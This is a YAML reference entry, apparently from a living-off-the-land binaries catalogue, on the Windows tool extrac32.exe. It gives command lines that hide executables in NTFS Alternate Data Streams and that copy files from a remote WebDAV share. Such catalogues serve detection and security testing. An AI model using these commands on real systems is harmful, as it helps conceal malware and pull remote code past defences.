---
name: extrac32.exe
description: 
functions:
  ads:
    - description: Extracts the source CAB file into an Alternate Data Stream (ADS) of the target file.
      code: extrac32 C:\ADS\procexp.cab c:\ADS\file.txt:procexp.exe
    - description: Extracts the source CAB file into an Alternate Data Stream (ADS) of the target file.
      code: extrac32 \\webdavserver\webdav\file.cab c:\ADS\file.txt:file.exe
  download:
    - description: Copy the source file to the destination file and overwrite it.
      code: extrac32 /Y /C \\webdavserver\share\test.txt C:\folder\test.txt
resources: 
    - resource: https://oddvar.moe/2018/04/11/putting-data-in-alternate-data-streams-and-how-to-execute-it-part-2/
    - resource: https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f
    - resource: https://twitter.com/egre55/status/985994639202283520
fullpath: 
    - path: c:\windows\system32\extrac32.exe
    - path: c:\windows\sysWOW64\extrac32.exe
notes: Thanks to Oddvar Moe - @oddvarmoe, egre55 - @egre55
---